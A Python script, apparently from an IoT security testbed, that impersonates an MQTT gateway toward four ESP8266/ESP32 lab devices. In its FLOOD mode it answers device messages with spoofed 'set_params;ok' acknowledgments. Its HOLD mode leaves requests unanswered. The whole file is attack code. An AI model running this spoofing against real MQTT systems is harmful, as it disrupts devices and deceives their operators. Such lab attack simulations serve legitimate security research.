import random
import aiomqtt
import asyncio
import os
import ast
import pymysql
from datetime import datetime
import json
from dotenv import load_dotenv
from enum import IntEnum

class TYPE(IntEnum):
    FLOOD = 1
    HOLD = 2

ATTACK_TYPE = TYPE.FLOOD

DEVICES = ["esp8266/inside", "esp8266/outside", "esp32/light", "esp32/window"]

load_dotenv()

async def send_weights(client: aiomqtt.Client):
    while True:
        for device in DEVICES:
            await client.publish(f"cmd_gateway/{device}", "get_params", retain=True)
            print(f"Published 'get_params' on cmd_gateway/{device}")

        await asyncio.sleep(15 * 60) # Request get_params every 15 minutes


async def main():
    async with aiomqtt.Client(hostname=os.environ.get("MQTT_HOST"), port=int(os.environ.get("MQTT_PORT"))) as client:
        asyncio.create_task(send_weights(client))

        for device in DEVICES:
            await client.subscribe(f"cmd_mcu/{device}")

        async for message in client.messages:
            if message.topic.matches("cmd_mcu/#"):
                if message.payload.decode() != "":
                    if ATTACK_TYPE == TYPE.FLOOD: # Publish 'ok' message
                        await client.publish(message.topic.value.replace('cmd_mcu', 'cmd_gateway'), f"set_params;ok".encode(), retain=True)
                        await client.publish(message.topic.value, "", retain=True)
                    elif ATTACK_TYPE == TYPE.HOLD: # Leave on hold
                        pass
            


asyncio.run(main())
